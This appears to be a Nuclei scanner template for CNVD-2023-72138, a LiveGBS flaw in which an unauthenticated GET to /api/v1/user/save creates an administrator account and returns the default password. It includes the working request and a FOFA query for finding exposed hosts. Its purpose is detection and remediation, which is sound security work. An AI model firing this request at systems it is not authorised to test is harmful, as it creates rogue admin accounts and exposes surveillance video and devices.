id: CNVD-2023-72138

info:
  name: LiveGBS user/save 逻辑缺陷漏洞（CNVD-2023-72138）
  author: pussycat0x
  severity: high
  description: |
    LiveGBS 的用户保存接口存在逻辑鉴权缺陷，攻击者可在未充分授权的情况下提交管理员用户信息。模板请求 `/api/v1/user/save` 创建管理员角色用户，并通过默认密码字段和 JSON 响应确认漏洞。
  impact: |
    - 攻击者可能创建或修改管理员账号，接管视频平台管理后台。
    - 平台被接管后，监控通道、设备配置和视频资源可能被查看、篡改或删除。
  remediation: |
    - 升级 LiveGBS 至修复版本，确保用户新增和角色变更接口强制认证与权限校验。
    - 禁止通过 GET 请求执行用户创建或权限变更操作，并增加 CSRF 与审计保护。
    - 检查用户列表、角色配置和登录日志，删除异常账号并修改默认密码。
  reference:
    - https://github.com/wy876/POC/blob/main/LiveGBS%E5%AD%98%E5%9C%A8%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7%E6%BC%8F%E6%B4%9E(CNVD-2023-72138).md
  metadata:
    max-request: 1
    verified: true
    fofa-query: icon_hash="-206100324"
  tags: cnvd,cnvd2023,livegbs,info-leak,vuln

variables:
  user: "{{to_lower(rand_base(5))}}"

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/v1/user/save?ID=&Username={{user}}&Role=管理员&Enable=true"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"DefaultUserPassword": "12345678"'
          - 'ID'
        condition: and

      - type: word
        part: content_type
        words:
          - 'application/json'

      - type: status
        status:
          - 200
